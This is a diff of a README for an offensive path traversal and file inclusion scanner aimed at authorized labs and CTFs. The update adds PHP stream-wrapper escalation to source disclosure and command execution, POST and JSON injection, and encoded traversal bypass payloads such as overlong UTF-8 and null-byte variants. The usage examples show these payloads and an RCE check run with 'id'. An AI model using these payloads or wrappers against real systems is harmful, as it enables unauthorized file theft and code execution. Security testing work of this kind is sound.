@@ -2,56 +2,76 @@
 
 [![tests](https://github.com/DarkArrow12/path-traversal-scanner/actions/workflows/tests.yml/badge.svg)](https://github.com/DarkArrow12/path-traversal-scanner/actions/workflows/tests.yml)
 
-A path traversal and file inclusion testing tool. Point it at a parameter, it
-tries the known traversal bypass families, confirms which one leaks a file, and
-saves what it read. Built for lab work and authorized assessments.
+A path traversal and file inclusion testing tool. Point it at an injection
+point, it tries the known traversal bypass families, confirms which one leaks a
+file, and — on PHP targets — escalates through stream wrappers to source
+disclosure and code execution. Built for lab work and authorized assessments.
 
 ## Authorized use only
 
 Offensive tool. Use it only against systems you own or are explicitly authorized
 to test — PortSwigger / TryHackMe / HTB labs, CTFs, and your own targets.
 Unauthorized use against third-party systems is illegal. Requests are delayed by
-default and `--help` carries the same notice.
+default (sequential unless you opt into `--threads`) and `--help` carries the
+same notice.
 
 ## Install
 
 ```bash
 pip install -e .          # exposes the `traverse` command
-# or run without installing:
-python -m traverse --help
+python -m traverse --help # or run without installing
 ```
 
-Only runtime dependency is `requests`. Tests need `pytest` (`pip install -e ".[dev]"`).
+Runtime dependency: `requests`. Tests: `pip install -e ".[dev]"` then `pytest -q`.
 
 ## Usage
 
-Mark the injection point with `FUZZ`:
+Mark the injection point with `FUZZ`. It can live in the URL, a POST body, or a
+JSON body.
 
 ```bash
 # query parameter
 traverse -u "https://LAB-ID.web-security-academy.net/image?filename=FUZZ" \
          --cookie "session=YOUR_TOKEN"
 
-# path segment
-traverse -u "http://target/ftp/FUZZ"
+# path segment (e.g. OWASP Juice Shop /ftp poison null byte)
+traverse -u "http://target:3000/ftp/FUZZ" --target-file package.json.bak \
+         --null-exts .md --signature '"dependencies"' --output json
 
-# name the parameter and let traverse add the marker
-traverse -u "https://target/image" --param filename
+# POST form body
+traverse -u "http://target/download" --data "file=FUZZ"
+
+# JSON API body
+traverse -u "http://target/api/read" --json '{"path":"FUZZ"}'
+
+# read PHP source via php://filter (base64 auto-decoded)
+traverse -u "http://target/index.php?page=FUZZ" --wrapper filter --resource config.php
+
+# code execution check on a PHP LFI (unique canary confirms exec)
+traverse -u "http://target/index.php?page=FUZZ" --wrapper data --cmd id
 ```
 
 Quote the URL — a bare `?`/`&` is mangled by the shell.
 
+### Key flags
+
 | Flag | Meaning | Default |
 |------|---------|---------|
-| `-u, --url` | Target URL with a `FUZZ` marker | — |
-| `--param` | Parameter to inject into (adds `=FUZZ`) | — |
-| `--target-file` | Read one specific file | built-in library |
+| `-u, --url` | Target with a `FUZZ` marker | — |
+| `--param` | Add `=FUZZ` to this parameter | — |
+| `--data` / `--json` | Inject into a POST / JSON body | — |
+| `--method` | HTTP method | GET, or POST with a body |
+| `--wrapper` | `filter` / `data` / `expect` / `input` | — |
+| `--resource` / `--cmd` | File for `filter` / command for RCE wrappers | — |
+| `--target-file` / `--signature` | Read one file / its detection regex | library |
+| `--categories` | `poc,secrets,config,cloud,source` | all |
 | `--os` | `linux` / `windows` / `both` | `both` |
-| `--depth` | Max `../` depth tried | `8` |
+| `--depth` | Max `../` depth | `8` |
+| `--null-exts` | Null-byte extensions, e.g. `.md,.pdf` | `.md,.pdf,.png,.jpg` |
 | `--cookie` / `--header` | Session cookie / extra header (repeatable) | — |
-| `--delay` | Seconds between requests | `0.3` |
+| `--delay` / `--threads` | Seconds between requests / concurrency | `0.3` / `1` |
+| `--output` / `--outfile` | `console` or `json` / write to a file | console / stdout |
 | `--all` | Don't stop at the first HIGH hit | off |
-| `--loot-dir` | Where leaked content is saved | `./loot` |
 
 ## Bypass families
 
@@ -65,20 +85,34 @@ would triple-encode and break the payload).
 | Absolute | `/etc/passwd` | strips `../` only |
 | Non-recursive | `....//....//etc/passwd` | single-pass strip |
 | Encoded (single/double) | `%252e%252e%252f…` | decode-then-filter |
+| 16-bit unicode | `%u002e%u002e%u2215…` | IIS/.NET decoders |
+| UTF-8 overlong | `%c0%ae%c0%ae%c0%af…` | lax UTF-8 decoders |
+| Mangled / dot-truncation | `..././`, `.../.../` | naive `./`/`../` strip |
 | Leading path prefix | `/var/www/images/../../etc/passwd` | "must start with base" |
-| Null byte | `…/etc/passwd%00.png` | extension allowlist |
-| CTF extras | `..;/`, `file://`, Windows `..\` | reverse proxy / Java / Windows |
+| Null byte (single/double) | `…/passwd%00.png`, `…%2500.md` | extension allowlist |
+| CTF extras | `..;/`, `file://`, Windows `..\`, `c:\` | reverse proxy / Java / Windows |
+
+## File-inclusion wrappers (PHP)
+
+| Wrapper | Effect | Confirmed by |
+|---------|--------|--------------|
+| `php://filter` | Read source without executing it | base64 blob decodes to PHP |
+| `data://` | Execute inline PHP (`allow_url_include`) | echoed RCE canary |
+| `expect://` | Run a command (expect extension) | echoed RCE canary |
+| `php://input` | Execute PHP from the request body | echoed RCE canary |
 
 ## How it works
 
 The bypass engine (`traverse/payloads.py`) expands one target file into every
-family above. The detector (`traverse/detector.py`) confirms a hit in three
-tiers: **HIGH** when the file's signature regex matches (e.g. `root:x:0:0:` for
-`/etc/passwd`), **MEDIUM** when the response diverges sharply from a failure
-baseline learned by first requesting a junk filename, **NONE** otherwise. The
-target library (`traverse/data/targets.json`) keeps file paths and signatures as
-data, so new targets need no code changes. Only `scanner.py`/`cli.py` touch the
-network.
+family above; the wrapper engine (`traverse/wrappers.py`) builds the PHP stream
+payloads. The transport layer (`traverse/transport.py`) injects the `FUZZ`
+marker into the URL, a POST body, or a JSON body (round-tripped through the JSON
+parser so payloads are escaped correctly). The detector (`traverse/detector.py`)
+confirms a hit in tiers: **HIGH** on an echoed RCE canary, a matching file
+signature (e.g. `root:x:0:0:`), or a base64 blob that decodes to PHP source;
+**MEDIUM** when the response diverges sharply from a failure baseline;
+**NONE** otherwise. Targets live as data (`traverse/data/targets.json`), tagged
+by category. Only `scanner.py`/`cli.py` touch the network.
 
 ## Tests
 
@@ -86,13 +120,12 @@ network.
 pytest -q      # offline unit tests — no network
 ```
 
-Live acceptance: run the query-parameter command above against a PortSwigger lab
-and expect a HIGH hit printing a `root:x:0:0:` snippet, loot saved to `./loot/`.
+Live acceptance: run a query-parameter command against a PortSwigger lab and
+expect a HIGH hit printing a `root:x:0:0:` snippet, loot saved to `./loot/`.
 
-## Scope and limitations
+## Demo
 
-Focused on file read via path traversal. Injection is via a `FUZZ` marker in the
-URL/query/path. See `CHANGELOG.md` for what each release adds.
+_A recorded run against a local lab target lands here (`docs/demo/`)._
 
 ## License
 
